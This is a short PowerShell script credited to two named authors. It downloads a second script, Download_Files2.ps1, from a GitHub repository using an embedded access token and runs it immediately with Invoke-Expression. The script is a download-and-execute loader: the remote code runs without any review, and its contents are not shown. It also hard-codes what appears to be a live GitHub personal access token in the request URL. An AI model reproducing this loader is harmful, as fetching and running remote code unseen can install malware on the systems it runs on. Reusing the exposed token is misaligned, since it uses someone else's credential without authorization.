# Created by Fabian and Arber

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$Script = Invoke-RestMethod https://api.github.com/repos/Igneele91/Hi-1test/contents/Download_Files2.ps1?access_token=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 -Headers @{”Accept”= “application/vnd.github.v3.raw”}

Invoke-Expression $Script

